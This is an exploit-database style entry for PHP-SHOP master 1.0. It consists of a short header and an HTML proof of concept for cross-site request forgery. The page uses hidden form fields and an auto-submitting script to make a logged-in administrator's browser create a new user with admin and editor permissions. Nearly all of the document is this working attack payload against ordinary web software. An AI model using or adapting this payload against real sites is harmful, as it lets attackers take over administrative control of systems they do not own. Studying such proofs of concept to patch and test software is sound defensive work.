@@ -1,0 +1,32 @@
+# Exploit Title: PHP-SHOP master 1.0 - Cross-Site Request Forgery (Add admin)
+# Exploit Author : Alireza Norkazemi
+# Date: 2018-10-15
+# Vendor Homepage : https://github.com/joeyrush/PHP-SHOP
+# Software link: https://github.com/joeyrush/PHP-SHOP/archive/master.zip
+# Version: 1.0
+# Tested on: Windows 10
+# CVE: N/A
+
+# Proof of concept:
+# Exploit:
+
+<html>
+<head>
+<meta charset="UTF-8">
+<title>POC</title>
+</head>
+<body>
+<form action="http://127.0.0.1/clone/SHOP-PHP/admin/users.php?add=1"
+method="post">
+<input type="hidden" name="name" value="TEST">
+<input type="hidden" name="email" value="TEST2">
+<input type="hidden" name="password" value="T3ST123">
+<input type="hidden" name="confirm" value="set">
+<select name="permissions"><option value="admin,editor"></option></select>
+<input type="submit" value="Add User">
+</form>
+<script>
+document.forms[0].submit();
+</script>
+</body>
+</html>
